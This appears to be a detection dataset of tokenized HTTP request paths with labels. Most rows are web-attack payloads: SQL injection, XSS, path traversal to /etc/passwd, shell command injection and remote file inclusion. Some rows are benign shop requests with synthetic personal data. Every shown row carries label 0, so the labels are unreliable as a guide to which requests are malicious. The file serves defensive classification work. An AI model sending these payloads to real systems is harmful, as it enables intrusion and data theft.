sentences 	 labels
/  '  .  $ _server [  ' php_self '  ]  .  '  ?  '  .  $ _server [  ' query_string '  ]  .  '  & act = img & img = change  \r\n\r\n 	 0
/ examples / servlets / servlet / admin / configset . php ? settings_dir =  / etc / passwd \ x00  \r\n\r\n 	 0
/ o35zot2r . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ jnv890lt . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ path_script / createurl . php ? formurl = http :  /  / 192 . 168 . 202 . 96 : 8080 / no4ghqiguzhst ?  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  (  "  " lzyl "  "  like  "  " lzyl  \r\n\r\n 	 0
/ string / strings / parameters = echo $ ifsuplbdt $  (  ( 24 + 49 )  )  $  ( echo $ ifsuplbdt ) uplbdt \  \r\n\r\n 	 0
/ j4oqyvga . jsp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ examples / jsp / num / minis . php ? month =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ a0imiuf1 . dll ?  < meta http-equiv = set-cookie content =  " testxqrn = 4654 "  >  \r\n\r\n 	 0
/ examples / jsp / error / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ scripts / awstatstotals . php ? sort =  {  $  { passthru ( chr ( 105 )  . chr ( 100 )  )  }  }  {  $  { exit (  )  }  }  \r\n\r\n 	 0
/ string / strings / parameters = '  ; echo $ ifsxuudge $  (  ( 67 + 2 )  )  $  ( echo $ ifsxuudge ) xuudge /  /  \r\n\r\n 	 0
/ cgi-915 / gw5 / gwweb . exe ? htmlver = aaa & get-context  \r\n\r\n 	 0
/ protection . php ? action = logout & siteurl =  / etc / passwd  \r\n\r\n 	 0
/ string / id = 1 & nombre = vino + rioja & precio = 85 /  & cantidad = 26 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / xmlfile = c :  / bea / weblogic81 / samples / server / examples / src / examples / xml / orderparser / order . xml  \r\n\r\n 	 0
/ hrttz9fj . html ?  < meta http-equiv = set-cookie content =  " testtbjy = 7334 "  >  \r\n\r\n 	 0
/ string / strings / parameters = "  )  ;  } print (  ` echo utfrof \ necho  $  (  ( 67 + 6 )  )  \ necho utfrof \ necho utfrof `  )  ;  /  / utfrof  \r\n\r\n 	 0
/ forum . asp ? n = c :  \ boot . ini | 41 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ; c :  &  # 039 ;  .  \r\n\r\n 	 0
/ cgi-bin / sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  \r\n\r\n 	 0
/ en-us / h5sc3gxy . asp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null , null , null , null )   #  \r\n\r\n 	 0
/ awstats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  "  \ 0174 \ 0044 \ 0000 \ 0377 \ 0347 "   >  >   / tmp / wrkvkjjzem0 ; echo | awstats830225 . txt  \r\n\r\n 	 0
/ main . php ? logout =  '  \ x0adel \ x09q55586739 \ x09 #  \r\n\r\n 	 0
/ supporter / index . php ? t = ticketfiles & id =  & lt ; script & gt ;  < script > alert (  ' vulnerable '  )  <  / script >  & lt ;  / script & gt ;  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  and  (  (  (  "  " ipqw "  "  like  "  " ipqw  \r\n\r\n 	 0
/ string / modo = registro & login = shimiz & password = m5x0e & nombre = nimsi & apellidos = cat + viera & email = talbot_polani @ clichotel . sj & dni = 56967582d & direccion = avenida + industria + 48 ,  + 12h & ciudad = sant + mart + de + riucorb & cp = 44124 & provincia = zaragoza & ntc = 5246598463194503 & b1 =  +  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  ,  ( select  ( case when  ( 7616 = 7616 )  then 1 else 1 /  ( select 0 )  end )  )  \r\n\r\n 	 0
/ examples / jsp / error / config . php ? path [ docroot ]  =  / etc / passwd \ x00  \r\n\r\n 	 0
/ scripts / index2 . cgi ? frames = yes & board = demo & mode = current & threads = collapse & message =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / modo = entrar & login = lutz & pwd = opima & remember = on /  & b1 = entrar  \r\n\r\n 	 0
/ tuwjta1w . cfm ?  < meta http-equiv = set-cookie content =  " testpokn = 7494 "  >  \r\n\r\n 	 0
/ string / id = 3 & nombre = queso + manchego & precio = 100 /  & cantidad = 57 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  union all select null , null --  \r\n\r\n 	 0
/ x2gyorli . php ?  < meta http-equiv = set-cookie content =  " testwhac = 3130 "  >  \r\n\r\n 	 0
/ string / id = 3 & nombre = jamn '  + ibric- ' o & precio = 85 & cantidad = 80 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ phpmyadmin / lib / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl  \r\n\r\n 	 0
/ dff_php_frameworkapi-latest / include / dff_sku . func . php ? dff_config [ dir_include ] xxpathxx  \r\n\r\n 	 0
/ error / 500error . jsp ? et = 1 < script > alert (  ' vulnerable '  )  <  / script >  ;  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  |  |  ( select  ' awba '  from dual where 3749 = 3749 and 1445 = 3334 --  \r\n\r\n 	 0
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo nsnyeu )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  |  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  or  ( select  *  from  ( select ( sleep ( 5 )  )  ) ydpu )  \r\n\r\n 	 0
/ examples / jsp / cal / admin / admin . php ? sid =  '  \r\n\r\n 	 0
/ string / modo = registro & login = jean-jac & password = desfavorecer & nombre = humildad & apellidos = sanagua + manzano & email = polakov_gaar @ rocofer . kh & dni = 08092387k & direccion = plaza + del + ensanche + 33 + 12-a & ciudad = lantadilla & cp = 47494 & provincia = barcelona & ntc = 7269685005406130 & b1 =  +  \r\n\r\n 	 0
/ string / strings / parameters = -1 <  !  --   --   --  >  < script > document . cookie = true ;  <  / script >  <  !  --   --   --  >  \r\n\r\n 	 0
/ cgi-bin / test . bat ?  | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  \r\n\r\n 	 0
/  ?  < script > document . cookie =  " testtbbe = 856 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = -8773 %  '  )  )  )  union all select 8941 , 8941 , 8941 , 8941 , 8941 , 8941 #  \r\n\r\n 	 0
/ help . php ? q = del ; q42148333 & rem ;  \r\n\r\n 	 0
/ string / strings / parameters = < style type =  " text / css "  > body { background : url (  " javascript : alert (  ' xss '  )  "  )  }  <  / style >  \r\n\r\n 	 0
/ string / modo = registro & login = hallsy6 & password = machete & nombre = facunda & apellidos = naudi & email = dinehart @ barebackspain . sh & dni = 22586543z & direccion = c /  + torreta ,  + 115 ,  + 6a & ciudad = taradell & cp = 4416a & provincia = valladolid & ntc = 6475224906467741 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  \r\n\r\n 	 0
/ string / id = 2 & nombre = queso + manchego & precio = 85 /  & cantidad = 18 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / modo = registro & login = bousfiel59 & password = de ! 9n & nombre = genara & apellidos = boneton + casares & email = eckhardt @ englishiseasy . nc & dni = b4b2559359k & direccion = pasaje + calzadilla + 14 ,  + 10 ? h & ciudad = carboneros & cp = 27739 & provincia = madrid & ntc = 3702071436789346 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = "  or 1 = 1 or  "  "  =  "  \r\n\r\n 	 0
/ javascript / index2 . exe  \r\n\r\n 	 0
/ cgi-bin / excite ; ifs =  \  "  $  \  "  ;  / bin / cat  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = < script > document . cookie =  " testpokn = 7494 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = -2745 '  or elt ( 1032 = 1032 , 3623 )  \r\n\r\n 	 0
/ help . php ? q =  "  & rm \ x09q98836719 & rem \ x09  \r\n\r\n 	 0
/ recordings / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  \r\n\r\n 	 0
/ javascript / 14 . exe  \r\n\r\n 	 0
/ string / strings / parameters = <  / script >  /  /  [  "  '  `  --  >  ]  ]  >  ]  <  / div >  \r\n\r\n 	 0
/ en-us / s7qus4g3 . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo pohuxh )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  \r\n\r\n 	 0
/ string / strings / parameters = "  echo $ ifsrskgdd $  (  ( 67 + 8 )  )  $  ( echo $ ifsrskgdd ) rskgdd /  /  \r\n\r\n 	 0
/ string / modo = registro & login = rayna & password = sa5di-3 & nombre = rolando & apellidos = corzo & email = mueller @ x2 . com . gh ' injected_param & dni = 15491128f & direccion = calle + granate ,  + 21 ,  +  & ciudad = lahiguera & cp = 50316 & provincia = santa + cruz + de + tenerife & ntc = 2289103302521090 & b1 = registrar  \r\n\r\n 	 0
/ help . php ? q =  "  \ x0asleep 8  #  \r\n\r\n 	 0
/ string / strings / parameters = '  echo udkfrm $  (  ( 88 + 90 )  )  $  ( echo udkfrm ) udkfrm |  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  as bpap where 7758 = 7758 or 4240 =  ( select 4240 from pg_sleep ( 5 )  )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  ; begin user_lock . sleep ( 5 )  ;  end and  (  (  ' zlsq '  =  ' zlsq  \r\n\r\n 	 0
/ examples / jsp / cal / bb_func_txt . php ? pathtofiles =  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = '  |  | echo jqlwqp $  (  ( 26 + 32 )  )  $  ( echo jqlwqp ) jqlwqp '  \r\n\r\n 	 0
/ main . php ? logout =  \ x0duname  > q42999467  #  \r\n\r\n 	 0
/ string / strings / parameters = -8153 '  )  as qhlb where 4948 = 4948 union all select 4948 , 4948 , 4948 , 4948 , 4948 , 4948 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  )  union all select null , null , null , null , null , null , null , null --  \r\n\r\n 	 0
/ cacti / index . php ? act = arcade & do = stats & gameid = 1 '  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo zsgsgj )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  \r\n\r\n 	 0
/ help . php ? q =  "  & ping ; -w ; 10000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;  \r\n\r\n 	 0
/ string / strings / parameters = |   [  4 -ne  $  ( echo gslybh  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  )  union all select null , null #  \r\n\r\n 	 0
/ string / strings / parameters = < a target =  " x "  href =  " xssme ? xss =  < script > addeventlistener (  " domframecontentloaded "  ,  function ( e )   { e . stoppropagation (  )  ;  }  ,  true )  ;  <  / script >  < iframe src =  " data : text / html ,  < script > object . defineproperty ( top ,   ' myevent '  ,   { value :  object ,  configurable :  true }  )  ; function y (  )   { alert ( top . safe . get (  )  )  ;  }  ; event  =  new object (  )  ; event . type  =   ' click '  ; event . istrusted  =  true ; y ( event )  ;  <  / script >  "  >  <  / iframe >  \r\n\r\n 	 0
/ string / modo = registro & login = denomme & password = pancracio & nombre = efeo & apellidos = barreda + icaza & email = rozycki7 @ estoespresto . bw & dni = 02882460p & direccion = cuesta ,  + 15 ,  + 1-g & ciudad = pont + de + suert ,  + el & cp = 4457a & provincia = a + corua & ntc = 0460083238510402 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = "  |  | echo $ ifsuqntqg $  (  ( 30 + 73 )  )  $  ( echo $ ifsuqntqg ) uqntqg &  \r\n\r\n 	 0
/ main . php ? stuff =  "  \ x0auname  > q45664393  #  \r\n\r\n 	 0
/ string / strings / parameters = "  &  & echo gjolms $  (  ( 8 + 3 )  )  $  ( echo gjolms ) gjolms "  \r\n\r\n 	 0
/ qb2xy9aw . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  order by 1 #  \r\n\r\n 	 0
/ string / strings / parameters = $  { shell_exec ( print (  ` echo mvsqei ; echo  $  (  ( 38 + 17 )  )  ; echo mvsqei ; echo mvsqei `  )  ;  \  \ mvsqei  \r\n\r\n 	 0
/ string / strings / parameters = < meta charset =  " x-mac-farsi "  > Â¼script Â¾confirm ( 1 )  /  / Â¼ / script Â¾  \r\n\r\n 	 0
/ help . php ? q =  & del ; q11223182 & rem ;  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo bfmcie )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 0
/ string / strings / parameters = -3859 )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  ( 5846 = 5846  \r\n\r\n 	 0
/ string / strings / parameters = 1 where 5691 = 5691 and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  --  \r\n\r\n 	 0
/ string / modo = registro & login = lodesert & password = herramienta & nombre = edelmira & apellidos = capo + garca & email = bugbee @ farma-job . cd & dni = 55645514g & direccion = c /  + santander + s / n ,  +  & ciudad = roca + de + la + sierra ,  + la & cp = 05289 & provincia = badajoz & ntc = 686788257238725 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = '  |   [  7 -ne  $  ( echo uumiwo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  and 4595 = 4595 #  \r\n\r\n 	 0
/ hipkz026 . php3 ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  \r\n\r\n 	 0
/ string / strings / parameters = "  &  & echo $ ifseocqfn $  (  ( 57 + 12 )  )  $  ( echo $ ifseocqfn ) eocqfn /  /  \r\n\r\n 	 0
/ tukodz3j . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  waitfor delay  ' 0 : 0 : 5 '  and  ( 2993 = 2993  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  )  ; if ( 7899 = 7899 )  select 7899 else drop function zbbp --  \r\n\r\n 	 0
/ recordings / blog . cgi ? submit = viewfile & month = 01 & year = 2004 & file =  | cat  / etc / passwd |  \r\n\r\n 	 0
/ cgi-bin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904220 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = | echo pvdddj $  (  ( 29 + 98 )  )  $  ( echo pvdddj ) pvdddj &  \r\n\r\n 	 0
/ string / modo = registro & login = michial3 & password = 83o3i7a374 & nombre = teodomira & apellidos = d ' paoli + garros & email = bessell @ ttivoni . is & dni = 32124292p & direccion = c /  + montevideo + 193 ,  +  & ciudad = rupi & cpa = 39572 & provincia = burgos & ntc = 8086742983774365 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo rybkip )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  \r\n\r\n 	 0
/ cacti / k / home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  where 1132 = 1132 or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  --  \r\n\r\n 	 0
/ i686v90l . jspa ?  < meta http-equiv = set-cookie content =  " testfutf = 1550 "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  "  " rbqs "  "  =  "  " rbqs  \r\n\r\n 	 0
/ examples / jsp / colors / login . php ? course =  "  >  < script > alert ( atutor_xss . nasl )  <  / script >  \r\n\r\n 	 0
/ m5103snj . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = x-injection-header :  attackvalue  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  )  and 4595 = 4595 #  \r\n\r\n 	 0
/ string / strings / parameters = -4385 %  '  )  )  union all select 6694 , 6694 , 6694 , 6694 , 6694 , 6694 , 6694 , 6694 , 6694 , 6694 #  \r\n\r\n 	 0
/ javascript / bank . exe  \r\n\r\n 	 0
/ string / strings / parameters = & echo $ ifspyiuyz $  (  ( 71 + 45 )  )  $  ( echo $ ifspyiuyz ) pyiuyz \  \  \r\n\r\n 	 0
/ top . php ? stuff =  '  \ x0asleep 10  #  \r\n\r\n 	 0
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 24 . 202 / main . php ? stuff = 1583574484 & frm_user =  & scr_height =  & scr_width = q24961432  \r\n\r\n 	 0
/ string / strings / parameters = '  &  & echo $ ifsbtaeif $  (  ( 13 + 69 )  )  $  ( echo $ ifsbtaeif ) btaeif \  \  \r\n\r\n 	 0
/ string / modo = entrar & login = any ?  set-cookie :  + tamper = 5765205567234876235 & pwd = acarrear & remember = off & b1 = entrar  \r\n\r\n 	 0
/ 6qbynt4f . cgi ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ cgi-bin / test-cgi . exe ?  < script > alert ( document . cookie )  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  )  or sleep ( 5 )  and  (  (  (  ' wuwv '  =  ' wuwv  \r\n\r\n 	 0
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / fphgokkkuu . sh +  >  +  / dev / null +  &  '  )  ;  function v  \r\n\r\n 	 0
/ cgi-915 /  . passwd  \r\n\r\n 	 0
/ top . php ? stuff =  ' uname \ x09 #  \r\n\r\n 	 0
/ scripts / polls . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ?  \r\n\r\n 	 0
/ o1zj4u9v . x ?  < script > document . cookie =  " testabrn = 6368 ;  "  <  / script >  \r\n\r\n 	 0
/ y8pmygrp . asp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = |   [  1 -ne  $  ( echo vnalzq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  \r\n\r\n 	 0
/ g3w7y7u5 . php ?  < meta http-equiv = set-cookie content =  " testbfpq = 3326 "  >  \r\n\r\n 	 0
/ string / str =  $  ( echo rpjjib )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  (  (  ' hxcq '  =  ' hxcq  \r\n\r\n 	 0
/ sprotectlinux / showpage . cgi ? page =  .  .  / html / splx_main . htm  \r\n\r\n 	 0
/ bridges / smf / logout . php ? path_to_smf = xxpathxx  \r\n\r\n 	 0
/ readmore . php ? config [  \  " sipssys \  "  ]  =  @ rfiurl  \r\n\r\n 	 0
/ string / modo = registro & login = mildrid & password = tortoise & nombre = yago & apellidos = vaz + aritza & email = navartil @ soyandaluz . va & dni = 25846203e & direccion = calle + san + toribio ,  + 84 +  & ciudad = torrente + de + cinca & cp = 19119 & provincia = burgos & ntc = 1165082581314448 & b1a = registrar  \r\n\r\n 	 0
/ examples / jsp / jsp2 / el / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo zzrwhs )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 0
/ i2n4v4rl . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo gfxuis )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  \r\n\r\n 	 0
/ string / strings / parameters = eval (  "  \ x61 \ x6c \ x65 \ x72 \ x74 \ x28 \ x31 \ x29â��? )  \r\n\r\n 	 0
/ bin / ppdscgi . exe  \r\n\r\n 	 0
/ string / strings / parameters = < iframe src = x onerror = prompt ( 1 )  >  \r\n\r\n 	 0
/ zmvq66jy . pl ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ odzk29aa . cfc ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  / script >  \r\n\r\n 	 0
/ mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331904464 , 4 --  & blog = 1  \r\n\r\n 	 0
/ edzaia0i . cgi ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ tukodz3j . html ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ ewc3rz1l . exe ?  < meta http-equiv = set-cookie content =  " testkgqo = 204 "  >  \r\n\r\n 	 0
/ main . php ? stuff =  "  & ver \ x0c > q64367569 & rem \ x0c  \r\n\r\n 	 0
/ string / strings / parameters = "  |   [  5 -ne  $  ( echo gbbauv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \r\n\r\n 	 0
/ string / strings / parameters = < li style = list-style : url (  )  onerror = alert ( 1 )  >  <  / li >  < div style = content : url ( data : image / svg + xml ,  < svg /  >  )  ; visibility : hidden onload = alert ( 1 )  >  <  / div >  \r\n\r\n 	 0
/ string / strings / parameters = 1 ; select sleep ( 5 )  \r\n\r\n 	 0
/ string / strings / parameters = -3750 '  +  ( select alpu where 3911 = 3911 order by 1 --  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  where 4382 = 4382 and 6607 = 2394 --  \r\n\r\n 	 0
/ string / strings / parameters = )  ;  } print (  ` echo kxlaqh `  .  ` echo  $  (  ( 80 + 88 )  )  `  .  ` echo kxlaqh `  .  ` echo kxlaqh `  )  ;  .  ' kxlaqh  \r\n\r\n 	 0
/ string / id = 1 +  & nombre = queso + manchego & precio = 85 & cantidad = 85 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / strings / parameters = "   str =  $  ( echo nneaqo )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  #  \r\n\r\n 	 0
/ scripts / texis . exe /  ? -dump  \r\n\r\n 	 0
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + a + 1f4 +  >  > ctdn  \r\n\r\n 	 0
/ bpnews / bn_smrep1 . php ? bnrep = xxpathxx ?  &  \r\n\r\n 	 0
/ string / modo = registro & login = cyndi & password = suburbicario & nombre = quimey & apellidos = mzquiz + metauten & email = mars @ visualreality . au & dni = 05744913l & direccion = urbaniz * acio + n + aguere + 192 ,  +  +  & ciudad = orba & cp = 40180 & provincia = cantabria & ntc = 9263586426997442 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = -8538 %  '  or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  '  %  '  =  '  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  ; select  ( case when  ( 3140 = 4625 )  then 1 else 3140 *  ( select 3140 from master .  . sysdatabases )  end )  --  \r\n\r\n 	 0
/ forum1 . asp ? n = 1753 & amp ; nn =  /  .  .  .  .  / boot . ini  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  "  " vcjt "  "  like  "  " vcjt  \r\n\r\n 	 0
/ phpmyadmin / news / index . dot ? id =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 . jpg  \r\n\r\n 	 0
/ string / strings / parameters = |   [  4 -ne  $  ( echo mmqksr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 0
/ scripts / index . php ? go = detail & id = -99999 /  *  *  / union /  *  *  / select /  *  *  / 0 , 1 , concat ( 1331919200 , 0x3a , 1131566153 )  , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16  \r\n\r\n 	 0
/ cgi-bin / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904208 '  )  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = "  |   [  6 -ne  $  ( echo bwwrbc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  \r\n\r\n 	 0
/ string / strings / parameters = < body style = overflow : auto ; height : 1000px onscroll = alert ( 1 )  id = x >  # x  \r\n\r\n 	 0
/ string / strings / parameters = -6298 '  or 4724 = 4876  \r\n\r\n 	 0
/ string / str =  $  ( echo fwggrq )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 0
/ javascript / forbidden . exe  \r\n\r\n 	 0
